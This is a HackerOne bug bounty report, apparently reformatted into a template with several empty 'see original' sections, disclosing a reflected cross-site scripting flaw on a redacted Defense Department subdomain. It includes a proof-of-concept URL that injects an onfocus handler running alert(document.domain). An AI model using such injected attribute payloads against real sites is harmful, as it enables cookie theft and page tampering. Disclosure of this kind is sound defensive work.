# Reflected XSS at https://████████/███/...

## Metadata
- **Source:** HackerOne
- **Report:** 976137 | https://hackerone.com/reports/976137
- **Submitted:** 2020-09-07
- **Reporter:** pudsec
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** medium
- **Vuln:** Cross-site Scripting (XSS) - Reflected
- **CVEs:** None
- **Category:** web-api

## Summary
## Summary:
According to [DOD Websites](https://www.defense.gov/Resources/Military-Departments/DOD-Websites/), the [███████](http://██████████) is a potential in-scope target, and where I discovered an unauthenticated `GET` based reflected cross-site scripting vulnerability on the `██████████` subdomain.

## Steps to Reproduce:
Visit the following URL;
```
https://█████/█████/████████=%22%20autofo

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

## Summary:
According to [DOD Websites](https://www.defense.gov/Resources/Military-Departments/DOD-Websites/), the [███████](http://██████████) is a potential in-scope target, and where I discovered an unauthenticated `GET` based reflected cross-site scripting vulnerability on the `██████████` subdomain.

## Steps to Reproduce:
Visit the following URL;
```
https://█████/█████/████████=%22%20autofocus%20onfocus=%22alert(document.domain)%22&Z_MODE=&Z_CALLER_URL=&Z_FORMROW=&Z_LONG_LIST=&Z_ISSUE_WAIT=
```
The following generated in the page source;
```
███████ VALUE="" autofocus onfocus="alert(document.domain)"%">
```
You will see that a pop-up appears, demonstrating that the JavaScript was executed successfully.

## Recommendations:
Sanitise any user input and check any other potential vulnerable parameters.

## Impact

A cross-site scripting vulnerability allows an attacker to embed malicious code into a URL of a vulnerable page, which is then executed when a victim views the page and can be used to gain account credentials by stealing cookies or modify the destination page to perform malicious actions.

</details>

---
*Analysed by Claude on 2026-05-24*
